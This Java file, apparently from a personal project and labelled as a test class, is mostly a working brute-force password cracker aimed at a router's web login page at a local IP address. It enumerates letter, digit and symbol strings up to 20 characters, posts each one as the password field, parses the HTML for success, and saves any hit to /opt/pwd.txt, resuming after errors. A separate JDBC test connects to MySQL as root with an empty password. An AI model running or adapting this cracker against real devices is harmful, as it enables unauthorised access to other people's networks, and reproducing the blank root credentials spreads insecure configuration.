package edu.auburn.bzl0048.metro;

import edu.auburn.bzl0048.metrobaidu.dao.PasswordDao;
import edu.auburn.bzl0048.metrobaidu.vo.passwordVO.PasswordVO;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.springframework.boot.autoconfigure.session.JdbcSessionDataSourceInitializer;
import org.springframework.http.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import javax.sql.DataSource;
import java.io.*;
import java.sql.Time;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Slf4j
public class test {

    private static String apiAddress = "http://192.168.124.1/router_password_mobile.asp";
    private static RestTemplate restTemplate = new RestTemplate();

    @Test
    public void testGetResult() {
        boolean result1 = getResult("456");
        boolean result2 = getResult("123");
        System.out.println(result1 + " : " + result2);
    }

    @Test
    public void jdbcTest() {

        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
        driverManagerDataSource.setDriverClassName("com.mysql.jdbc.Driver");
        driverManagerDataSource.setUrl("jdbc:mysql://localhost/password");
        driverManagerDataSource.setUsername("root");
        driverManagerDataSource.setPassword("");
        DataSource dataSource = driverManagerDataSource;
        JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);

        PasswordDao passwordDao = new PasswordDao(jdbcTemplate);
        PasswordVO passwordVO = new PasswordVO();
        passwordVO.setThreadName("FirstThread");
        passwordVO.setCounter(123);
        passwordDao.add(passwordVO);
    }


    public static void main(String[] args) throws InterruptedException {
        run(10000000, 20, 5);
    }

    private static void run(int initCounter, int maxLength, int waittingSeconds) throws InterruptedException {
        int currentCounter = dictionary(initCounter, maxLength);
        if (currentCounter >= 0) {
            log.info("Exception catched at counter "+ currentCounter +", sleeping for " +waittingSeconds+ " seconds");
            TimeUnit.SECONDS.sleep(waittingSeconds);
            run(currentCounter, maxLength, waittingSeconds);
        } else if (currentCounter == -2) {
            log.info("Successfully found the password, go to pwd.txt to find out!");
        } else {
            log.info("Stopped at counter " + currentCounter);
        }
    }

    private static int dictionary(int initCounter, int maxLength) {
        int counter = initCounter;
        try {
            //密码可能会包含的字符集合
            char[] fullCharSource = { '1','2','3','4','5','6','7','8','9','0',
                    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',  'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',  'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                    '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '"', '<', '>', '?', ';', '\'', ',', '.', '/', '-', '=', '`'};
//            int maxLength = 5;
            int fullCharLength = fullCharSource.length;
            StringBuilder stringBuilder = new StringBuilder();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream("/opt/pwd.txt"), "utf-8"));
            int stringLength = 0;
            while(stringBuilder.toString().length() <= maxLength) {
                if (stringLength != stringBuilder.toString().length()) {
                    stringLength = stringBuilder.toString().length();
                    log.info("Current string length = " + stringLength);
                }

                stringBuilder = new StringBuilder(maxLength * 2);
                int _counter = counter;
                while (_counter >= fullCharLength) {
                    stringBuilder.insert(0, fullCharSource[_counter % fullCharLength]);
                    _counter = _counter / fullCharLength;
                    //处理进制体系中只有10没有01的问题，在穷举里面是可以存在01的
                    _counter--;
                }
                stringBuilder.insert(0,fullCharSource[_counter]);
                counter++;

//            pw.write(stringBuilder.toString()+"\n");
//            System.out.println(stringBuilder.toString());
//            TimeUnit.SECONDS.sleep(1);
//                TimeUnit.MILLISECONDS.sleep(100);
                if (getResult(stringBuilder.toString())) {
                    pw.write(stringBuilder.toString());
                    log.info("true password = " + stringBuilder.toString() + " counter = " + counter + " _counter = " + _counter);
                    return -2;
                } else {
                    log.info("false password = " + stringBuilder.toString() + " counter = " + counter + " _counter = " + _counter);
                }
            }
        } catch (Exception e) {
            return counter;
        }
        return -1;
    }

    private static boolean getResult(String pwd) {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        MultiValueMap<String, String> map= new LinkedMultiValueMap<>();
        map.add("psd", pwd);
        HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(map, headers);

        ResponseEntity<String> response = restTemplate.postForEntity( apiAddress, request , String.class );
        String responseBody = response.getBody();
        boolean result = praseHtml(responseBody);
//        log.info( map + " "+ result);
        return result;
    }


    private static boolean praseHtml(String htmlBody) {
        // var resultInfo="false;0";
        String patternString = "var resultInfo=\"(false|true|null);";
        Pattern pattern = Pattern.compile(patternString);
        Matcher m = pattern.matcher(htmlBody);
        String matchedString = "";
        while (m.find()) {
            matchedString = m.group(0);
        }
        String[] resultArr = matchedString.replaceAll("var resultInfo=\"", "").split(";");
        String result = resultArr[0];
        if (result.equals("true")) {
            return true;
        } else {
            return false;
        }
    }
}
